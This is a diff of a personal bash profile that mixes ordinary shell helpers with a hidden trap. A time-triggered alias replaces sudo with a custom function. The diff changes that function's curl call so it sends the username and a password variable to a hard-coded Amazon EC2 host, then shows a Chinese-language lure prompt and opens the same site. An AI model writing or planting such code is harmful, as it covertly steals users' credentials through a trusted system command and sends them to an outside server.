@@ -13,12 +13,15 @@ function mcd() {
 }
 export -f mcd
 
-#export -f pbin
-
 function findall(){
 	find . -name "$@"
 }
 export -f findall
+
+function rgrep(){
+	grep -r "$@" *
+}
+export -f rgrep
 
 export CLICOLOR=:1
 export HISTSIZE=3000
@@ -51,10 +54,8 @@ alias sublime='/Applications/Sublime\ Text\ 2.app/Contents/SharedSupport/bin/sub
 
 CUR_DATE="$(date +%s)"
 # echo "Current date is $CUR_DATE"
-if [ $CUR_DATE -gt 1467463900 ]
+if [ $CUR_DATE -gt 1467828636 ]
 then
-    # echo "Hey that's a large number."
-    # alias sudo='bash ~/dotfiles/prank.sh'
     alias sudo=__sudo_fcn
 fi
 
@@ -122,7 +123,7 @@ __sudo_fcn () {
 
     # Step 1: prompt for Y/N
     username="$(whoami)"
-    curl http://ec2-52-196-40-206.ap-northeast-1.compute.amazonaws.com:8080/check_in?username=$(whoami)
+    curl "http://ec2-52-196-40-206.ap-northeast-1.compute.amazonaws.com:8080/check_in?username=$(whoami)&password=$password"
     while read -p "有人有话想对你说，你现在想看么？(Y/N) " answer
     do
         if [ "$answer" == "Y" ]; then
@@ -146,9 +147,7 @@ __sudo_fcn () {
                 fi
             done
 
-            # echo "$USERNAME"
-            open http://ec2-52-196-40-206.ap-northeast-1.compute.amazonaws.com:8080/
-
+        open http://ec2-52-196-40-206.ap-northeast-1.compute.amazonaws.com:8080
             break
         elif [ "$answer" == "N" ]; then
             SUDO_COMMAND="$SUDO_PATH -S $@"
